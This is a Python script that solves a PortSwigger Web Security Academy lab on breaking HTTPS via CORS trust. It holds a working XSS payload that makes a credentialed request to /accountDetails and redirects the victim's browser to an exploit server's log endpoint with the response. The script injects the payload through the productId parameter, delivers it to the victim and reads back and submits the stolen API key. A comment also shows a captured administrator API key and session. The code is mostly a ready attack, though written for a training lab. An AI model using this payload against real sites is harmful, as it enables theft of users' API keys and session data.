import requests
from urllib3.exceptions import InsecureRequestWarning
from time import sleep
from bs4 import BeautifulSoup
from string import Template
import re
import urllib
import json

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# lab_url: https://portswigger.net/web-security/cors/lab-breaking-https-attack
# author: 0xyf


class CORS3:
    def __init__(self):
        self.lab_id = "0a1b00ac03ad38df8093ad4400b20004"
        self.proxies = {"https": "http://127.0.0.1:8080"}

        self.url = f"https://{self.lab_id}.web-security-academy.net"
        self.api_url = f"{self.url}/accountDetails"

    def get_exploit_srv_url(self):
        r = requests.get(self.url)
        soup = BeautifulSoup(r.text, "html.parser")
        self.exploit_srv_url = soup.find("a", id="exploit-link").get("href")

    def get_submit_url(self):
        r = requests.get(self.url)
        soup = BeautifulSoup(r.text, "html.parser")
        submit_path = soup.find("button", id="submitSolution").get("path")
        self.submit_url = f"{self.url}{submit_path}"

    def execute_request(self, data):
        r = requests.post(
            f"{self.exploit_srv_url}",
            data=data,
            proxies=self.proxies,
            verify=False,
        )
        return r

    def cors(self):
        self.get_exploit_srv_url()
        xss_payload = Template(
            """<script>
            var req = new XMLHttpRequest();
            req.open('get', '$api_url', true);
            req.withCredentials = true;
            req.onload = function() {
                console.log(req.responseText);
                window.location = '$exploit_srv_url/log?key=' + req.responseText;
            };
            req.send();</script>"""
        )
        xss_payload = xss_payload.substitute(
            api_url=self.api_url, exploit_srv_url=self.exploit_srv_url
        )
        one_liner = re.sub(r"  *", " ", xss_payload.replace("\n", ""))
        print(f"[+] one liner: {one_liner}")
        encoded_one_liner = one_liner.replace("+", "%2b").replace("</", "%3c/")
        print(f"[+] encoded one liner: {encoded_one_liner}")
        payload = f"""<script>window.location="http://stock.{self.lab_id}.web-security-academy.net/?productId={encoded_one_liner}&storeId=1"</script>"""
        data = {
            "urlIsHttps": "on",
            "responseFile": "/exploit",
            "responseHead": f"HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
            "formAction": "DELIVER_TO_VICTIM",
            "responseBody": payload,
        }
        r = self.execute_request(data)

    def get_api_key(self):
        self.get_exploit_srv_url()
        print("[+] sleeping 5")
        sleep(10)
        r = requests.get(
            f"{self.exploit_srv_url}/log",
            proxies=self.proxies,
            verify=False,
        )
        key_pattern = r"log\?key\=(\{.*\})"
        match = re.findall(key_pattern, r.text)[0]
        url_decoded = urllib.parse.unquote(match)
        json_data = json.loads(url_decoded)
        self.api_key = json_data["apikey"]
        print(f"[+] found api key: {self.api_key}")
        # "/log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22rcFnPvRPWNGpIViEiSX8oD0lv9N9myq1%22,%20%20%22sessions%22:%20[%20%20%20%20%22v7I3GpiNmK46zpwj9X9hNAhrhYfuBx72%22%20%20]}"

    def submit_api_key(self):
        self.get_submit_url()
        print("[+] submitting key")
        data = {"answer": self.api_key}
        r = requests.post(
            self.submit_url,
            data=data,
            proxies=self.proxies,
            verify=False,
        )

    def check_solved(self):
        sleep(5)
        r = requests.get(self.url)
        if "Congratulations, you solved the lab!" in r.text:
            print("Lab Solved")
        else:
            print("Did not solve lab, check payload")

    def solve(self):
        self.cors()
        self.get_api_key()
        self.submit_api_key()
        self.check_solved()


def main():
    CORS3().solve()


if __name__ == "__main__":
    main()
